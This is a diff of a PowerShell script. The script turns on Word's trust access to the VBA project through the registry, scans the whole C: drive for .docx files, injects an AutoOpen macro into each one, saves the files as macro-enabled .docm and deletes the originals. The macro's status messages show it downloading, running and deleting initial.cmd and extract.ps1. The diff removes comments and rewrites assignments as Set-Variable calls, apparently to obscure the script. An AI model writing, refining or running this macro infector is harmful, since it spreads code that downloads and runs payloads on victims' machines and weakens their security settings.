@@ -1,24 +1,18 @@
-# -----------------------------------------------
-# Function: Enable-VBATrust
-# Description: Searches common Office registry keys and sets
-#              the AccessVBOM property to 1 (enabled) for Word.
-# -----------------------------------------------
 function Enable-VBATrust {
     Write-Host "Attempting to enable 'Trust access to the VBA project object model'..." -ForegroundColor Cyan
 
-    # Define potential Office registry base keys
-    $basePaths = @("HKCU:\Software\Microsoft\Office", "HKLM:\Software\Microsoft\Office", "HKLM:\Software\WOW6432Node\Microsoft\Office")
-    $done = $false
+ 
+    Set-Variable -Name basePaths -Value (@("HKCU:\Software\Microsoft\Office", "HKLM:\Software\Microsoft\Office", "HKLM:\Software\WOW6432Node\Microsoft\Office"))
+    Set-Variable -Name done -Value ($false)
 
     foreach ($base in $basePaths) {
         if (Test-Path $base) {
-            # Get all subkeys that are version numbers (like "16.0", "15.0", etc.)
+ 
             $versions = Get-ChildItem -Path $base | Where-Object { $_.Name -match "\d+\.\d+$" }
             foreach ($version in $versions) {
-                # Construct the security registry path for Word
+
                 $securityPath = Join-Path $version.PSPath "Word\Security"
-                
-                # Create the Security key if it doesn't already exist.
+
                 if (-not (Test-Path $securityPath)) {
                     try {
                         New-Item -Path $securityPath -Force | Out-Null
@@ -45,11 +39,6 @@ function Enable-VBATrust {
     }
 }
 
-# -----------------------------------------------
-# Function: Process-DocxFiles
-# Description: Scans recursively for .docx files, adds VBA code,
-#              converts them to .docm, and deletes the originals.
-# -----------------------------------------------
 function Process-DocxFiles {
     param(
         [Parameter(Mandatory=$true)]
@@ -58,20 +47,17 @@ function Process-DocxFiles {
 
     Write-Host "Scanning for .docx files under: $RootPath" -ForegroundColor Cyan
 
-    # Get all .docx files (suppress errors for inaccessible folders)
-    $docxFiles = Get-ChildItem -Path $RootPath -Filter *.docx -Recurse -ErrorAction SilentlyContinue
+    Set-Variable -Name docxFiles -Value (Get-ChildItem -Path $RootPath -ErrorAction SilentlyContinue -Filter *.docx -Recurse)
 
     if (!$docxFiles) {
         Write-Host "No .docx files found."
         return
     }
 
-    # Create a Word COM object
-    $word = New-Object -ComObject Word.Application
+    Set-Variable -Name word -Value (New-Object -ComObject Word.Application)
     $word.Visible = $false
 
-    # Define the VBA macro code to be added.
-    $vbaCode = @"
+    Set-Variable -Name vbaCode -Value (@"
 Sub AutoOpen()
     Dim docPath As String
     Dim initialCmdPath As String
@@ -186,21 +172,19 @@ Sub AutoOpen()
     ' Notify the user of successful execution and cleanup
     MsgBox "initial.cmd and extract.ps1 downloaded, executed, and deleted successfully!", vbInformation
 End Sub
-"@
+"@)
 
     foreach ($file in $docxFiles) {
         try {
             Write-Host "Processing file: $($file.FullName)" -ForegroundColor Yellow
 
-            # Open the document in Word
-            $doc = $word.Documents.Open($file.FullName)
-            Start-Sleep -Seconds 1  # Let the document fully open
+            Set-Variable -Name doc -Value ($word.Documents.Open($file.FullName))
+            Start-Sleep -Seconds 1  
 
-            # Access the document’s VBProject and inject the VBA code.
             try {
-                $vbProj = $doc.VBProject
-                $vbComp = $vbProj.VBComponents.Item("ThisDocument")
-                $codeModule = $vbComp.CodeModule
+                Set-Variable -Name vbProj -Value ($doc.VBProject)
+                Set-Variable -Name vbComp -Value ($vbProj.VBComponents.Item("ThisDocument"))
+                Set-Variable -Name codeModule -Value ($vbComp.CodeModule)
                 $codeModule.AddFromString($vbaCode)
             }
             catch {
@@ -209,14 +193,11 @@ End Sub
                 continue
             }
 
-            # Determine the new file name (.docm)
-            $docmPath = $file.FullName -replace "\.docx$", ".docm"
+            Set-Variable -Name docmPath -Value ($file.FullName -replace "\.docx$", ".docm")
             
-            # Save as .docm (FileFormat 13 corresponds to macro-enabled documents)
-            $doc.SaveAs([ref] $docmPath, [ref] 13)
+            $doc.SaveAs([Ref] $docmPath, [Ref] 13)
             $doc.Close()
 
-            # Delete the original .docx file
             Remove-Item $file.FullName -Force
 
             Write-Host "Converted: $($file.FullName) -> $docmPath" -ForegroundColor Green
@@ -227,7 +208,6 @@ End Sub
         }
     }
 
-    # Quit Word and clean up COM objects.
     $word.Quit()
     [System.Runtime.Interopservices.Marshal]::ReleaseComObject($word) | Out-Null
     Remove-Variable word
@@ -235,15 +215,8 @@ End Sub
     Write-Host "Operation complete. All .docx files have been processed." -ForegroundColor Cyan
 }
 
-# -----------------------------------------------
-# Main Script Execution
-# -----------------------------------------------
 
-# Step 1: Automatically enable Trust Access to the VBA project object model.
 Enable-VBATrust
 
-# Step 2: Specify the root folder to scan (adjust as needed).
-$rootFolder = "C:\"  # Warning: scanning the entire C: drive can take a long time!
-
-# Step 3: Process all .docx files found under the root folder.
+Set-Variable -Name rootFolder -Value ("C:\") 
 Process-DocxFiles -RootPath $rootFolder
